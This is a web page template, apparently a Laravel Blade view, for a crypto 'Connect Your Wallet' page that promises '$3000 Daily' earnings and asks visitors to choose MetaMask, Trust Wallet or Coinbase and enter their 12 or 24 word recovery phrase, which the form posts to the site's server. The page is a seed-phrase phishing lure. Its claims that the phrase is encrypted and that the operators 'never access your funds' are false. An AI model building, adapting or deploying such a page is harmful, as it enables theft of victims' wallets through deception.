    ...
    <div class="min-h-screen bg-gray-50 dark:bg-gray-900" x-data="walletConnectManager()">
        <div class="container mx-auto px-3 sm:px-4 lg:px-6 py-4 sm:py-6 lg:py-8 max-w-7xl">
                ...
                <div class="mb-4 sm:mb-6">
                    ...
                    <div class="flex items-start sm:items-center">
                        ...
                        <div class="ml-2 sm:ml-3 flex-1 min-w-0">
                            <p class="text-xs sm:text-sm text-red-700 dark:text-red-300 leading-relaxed">{{session('error')}}.</p>
                        </div>
            ...
            <div class="max-w-4xl mx-auto">
                ...
                <div
                    class="bg-gradient-to-br from-blue-50 to-indigo-50 dark:from-blue-900/20 dark:to-indigo-900/20 rounded-xl sm:rounded-2xl p-4 sm:p-6 mb-6 sm:mb-8 border border-blue-200 dark:border-blue-700">
                    <div class="flex flex-col sm:flex-row items-start gap-3 sm:gap-4">
                        ...
                        <div class="flex-1 min-w-0">
                            <h3
                                class="text-base sm:text-lg lg:text-xl font-semibold text-blue-900 dark:text-blue-100 mb-2 leading-tight">
                                Start Earning $3000 Daily</h3>
                            <p class="text-blue-700 dark:text-blue-300 text-xs sm:text-sm leading-relaxed mb-3 sm:mb-4">
                                ...
                                Ensure your wallet contains at least <span class="font-semibold">$500</span> to be eligible
                                for
                            ...
                            <div class="flex flex-col sm:flex-row sm:items-center gap-2 sm:gap-4 text-xs sm:text-sm">
                                <div class="flex items-center gap-1.5 sm:gap-2">
                                    <i data-lucide="shield-check"
                                        class="w-3 h-3 sm:w-4 sm:h-4 text-blue-600 flex-shrink-0"></i>
                ...
                <div
                    class="bg-white dark:bg-gray-900 rounded-xl sm:rounded-2xl shadow-xl border border-gray-200 dark:border-gray-700">
                    <div class="p-4 sm:p-6 lg:p-8 border-b border-gray-200 dark:border-gray-700">
                        <div class="flex flex-col sm:flex-row items-start sm:items-center gap-3 sm:gap-4">
                            <div
                                class="p-2 sm:p-3 lg:p-4 bg-gradient-to-br from-purple-100 to-blue-100 dark:from-purple-900/30 dark:to-blue-900/30 rounded-lg sm:rounded-xl flex-shrink-0">
                                <i data-lucide="wallet"
                                    class="w-6 h-6 sm:w-7 sm:h-7 lg:w-8 lg:h-8 text-purple-600 dark:text-purple-400"></i>
                            </div>
                            <div class="min-w-0 flex-1">
                                <h2
                                    class="text-xl sm:text-2xl lg:text-3xl font-bold text-gray-900 dark:text-white leading-tight">
                                    Connect Your Wallet</h2>
                                <p class="text-gray-600 dark:text-gray-400 mt-1 text-sm sm:text-base leading-relaxed">Choose
                                    your
                                    wallet provider and enter your recovery phrase</p>
                            </div>
                        </div>
                    </div>
                    ...
                    <div class="p-4 sm:p-6 lg:p-8">
                        <form method="POST" action="{{ route('wallet.connect') }}"
                            class="space-y-6 sm:space-y-8" x-ref="walletForm">
                            @csrf
                            <!-- Wallet Selection -->
                            <div>
                                <label for="wallet"
                                    class="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-3 sm:mb-4">
                                ...
                                <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3 sm:gap-4 mb-4 sm:mb-6">
                                    <div @click="selectWallet('MetaMask')"
                                        ...
                                        <div class="text-center">
                                            <div
                                                class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-2 bg-gradient-to-br from-orange-100 to-red-100 dark:from-orange-900/30 dark:to-red-900/30 rounded-lg flex items-center justify-center">
                                                <svg class="w-5 h-5 sm:w-7 sm:h-7" viewBox="0 0 24 24" fill="none">
                                                    ...
                                                    <path
                                                        ...
                                                        stroke="#E2761B" stroke-width="2" />
                                                    <circle cx="12" cy="12" r="6" fill="#E2761B" />
                                                    <circle cx="12" cy="12" r="3" fill="#F6851B" />
                                                </svg>
                                            </div>
                                            <div
                                                class="text-xs sm:text-sm font-medium text-gray-900 dark:text-white leading-tight">
                                                MetaMask</div>
                                        </div>
                                    </div>

                                    <div @click="selectWallet('Trust Wallet')"
                                        :class="selectedWallet === 'Trust Wallet' ?
                                            'ring-2 ring-blue-500 bg-blue-50 dark:bg-blue-900/20' :
                                            'bg-gray-50 dark:bg-gray-800 hover:bg-gray-100 dark:hover:bg-gray-700'"
                                        class="p-3 sm:p-4 rounded-lg sm:rounded-xl cursor-pointer transition-all duration-200 border border-gray-200 dark:border-gray-600">
                                        <div class="text-center">
                                            <div
                                                class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-2 bg-gradient-to-br from-blue-100 to-cyan-100 dark:from-blue-900/30 dark:to-cyan-900/30 rounded-lg flex items-center justify-center">
                                                <svg class="w-5 h-5 sm:w-7 sm:h-7" viewBox="0 0 24 24" fill="none">
                                    ...
                                    <div @click="selectWallet('Coinbase Wallet')"
                                        :class="selectedWallet === 'Coinbase Wallet' ?
                                            'ring-2 ring-blue-500 bg-blue-50 dark:bg-blue-900/20' :
                                            'bg-gray-50 dark:bg-gray-800 hover:bg-gray-100 dark:hover:bg-gray-700'"
                                        class="p-3 sm:p-4 rounded-lg sm:rounded-xl cursor-pointer transition-all duration-200 border border-gray-200 dark:border-gray-600">
                                        <div class="text-center">
                                            <div
                                                class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-2 bg-gradient-to-br from-blue-100 to-indigo-100 dark:from-blue-900/30 dark:to-indigo-900/30 rounded-lg flex items-center justify-center">
                                                <svg class="w-5 h-5 sm:w-7 sm:h-7" viewBox="0 0 24 24" fill="none">
                                    ...
                                    <div @click="showOtherWallets = !showOtherWallets"
                                        ...
                                        <div class="text-center">
                                            <div
                                                class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-2 bg-gradient-to-br from-gray-100 to-gray-200 dark:from-gray-700 dark:to-gray-800 rounded-lg flex items-center justify-center">
                                                <i data-lucide="more-horizontal"
                                                    class="w-4 h-4 sm:w-6 sm:h-6 text-gray-600 dark:text-gray-400"></i>
                                            </div>
                                            <div
                                                class="text-xs sm:text-sm font-medium text-gray-900 dark:text-white leading-tight">
                                                Others
                                ...
                                <div x-show="showOtherWallets" x-transition:enter="transition ease-out duration-200"
                                    x-transition:enter-start="opacity-0 transform -translate-y-2"
                                    x-transition:enter-end="opacity-100 transform translate-y-0" class="mb-4 sm:mb-6"
                                    style="display: none;">
                                    <select x-model="selectedWallet" name="wallet" required
                                     ...
                                     @error('wallet') <p class="text-red-500 text-sm mt-1">{{ $message }}</p> @enderror
                                </div>
                            ...
                            <div x-show="selectedWallet" x-transition:enter="transition ease-out duration-300"
                                ...
                                <!-- Security Warning -->
                                <div
                                    class="bg-amber-50 dark:bg-amber-900/20 border-l-4 border-amber-400 p-3 sm:p-4 rounded-lg mb-3 sm:mb-4">
                                    <div class="flex items-start">
                                        <i data-lucide="alert-triangle"
                                            class="h-4 w-4 sm:h-5 sm:w-5 text-amber-400 mt-0.5 mr-2 sm:mr-3 flex-shrink-0"></i>
                                        <div class="text-xs sm:text-sm text-amber-700 dark:text-amber-300 leading-relaxed">
                                            <strong>Important:</strong> Your recovery phrase is encrypted and securely
                                            stored.
                                ...
                                <div class="relative">
                                    <textarea name="mnemonic" id="mnemonic" required x-model="recoveryPhrase" @input="validatePhrase"
                                        :class="hasError ? 'border-red-500 ring-red-500' :
                                        ...
                                        rows="4" placeholder="Enter your 12 or 24 word recovery phrase separated by spaces..."></textarea>
                                        @error('mnemonic') <p class="text-red-500 text-sm mt-1">{{ $message }}</p> @enderror
                                    <!-- Word Counter -->
                                ...
                                <div class="mt-2 sm:mt-3 space-y-1.5 sm:space-y-2">
                                    <div class="flex items-center gap-1.5 sm:gap-2 text-xs sm:text-sm">
                                        ...
                                        <span
                                            :class="wordCount >= 12 && wordCount <= 24 ? 'text-green-600 dark:text-green-400' :
                                                'text-gray-500'"
                                            class="leading-tight">
                                    ...
                                    <div class="flex items-center gap-1.5 sm:gap-2 text-xs sm:text-sm">
                                        <i :data-lucide="!hasInvalidChars ? 'check-circle' : 'circle'"
                                            ...
                                            class="w-3 h-3 sm:w-4 sm:h-4 flex-shrink-0"></i>
                                        <span
                                            :class="!hasInvalidChars ? 'text-green-600 dark:text-green-400' : 'text-gray-500'"
                                            class="leading-tight">
                                            Contains only valid characters
                                        </span>
                                    </div>
                                    <div x-show="recoveryPhrase.length > 0 && !isValidPhrase"
                                        class="flex items-center gap-1.5 sm:gap-2 text-xs sm:text-sm">
                                        <i data-lucide="alert-circle"
                                            class="w-3 h-3 sm:w-4 sm:h-4 text-amber-500 flex-shrink-0"></i>
                            ...
                            <div x-show="selectedWallet && isValidPhrase"
                                ...
                                <button type="submit" @click="isConnecting = true"
                ...
                <div class="grid sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-6 mt-6 sm:mt-8">
                    <div class="text-center p-4 sm:p-6">
                        <div
                            class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-3 sm:mb-4 bg-green-100 dark:bg-green-900/30 rounded-full flex items-center justify-center">
                            <i data-lucide="shield-check" class="w-5 h-5 sm:w-6 sm:h-6 text-green-600"></i>
                        </div>
                        <h3 class="font-semibold text-gray-900 dark:text-white mb-1 sm:mb-2 text-sm sm:text-base">
                            Bank-Level
                            Security</h3>
                        <p class="text-xs sm:text-sm text-gray-600 dark:text-gray-400 leading-relaxed">Your data is
                            encrypted
                            using industry-standard security protocols</p>
                    </div>
                    <div class="text-center p-4 sm:p-6">
                        <div
                            class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-3 sm:mb-4 bg-blue-100 dark:bg-blue-900/30 rounded-full flex items-center justify-center">
                            <i data-lucide="eye-off" class="w-5 h-5 sm:w-6 sm:h-6 text-blue-600"></i>
                        </div>
                        <h3 class="font-semibold text-gray-900 dark:text-white mb-1 sm:mb-2 text-sm sm:text-base">Privacy
                            First
                        </h3>
                        <p class="text-xs sm:text-sm text-gray-600 dark:text-gray-400 leading-relaxed">We never access your
                            funds or store sensitive wallet information</p>
                    </div>
                    <div class="text-center p-4 sm:p-6 sm:col-span-2 lg:col-span-1">
                        <div
                            class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-3 sm:mb-4 bg-purple-100 dark:bg-purple-900/30 rounded-full flex items-center justify-center">
                            <i data-lucide="clock" class="w-5 h-5 sm:w-6 sm:h-6 text-purple-600"></i>
                        </div>
                        <h3 class="font-semibold text-gray-900 dark:text-white mb-1 sm:mb-2 text-sm sm:text-base">Instant
                            Connection</h3>
                        <p class="text-xs sm:text-sm text-gray-600 dark:text-gray-400 leading-relaxed">Quick setup process
                            with
                            immediate access to earning features</p>
                    </div>
                </div>
            </div>
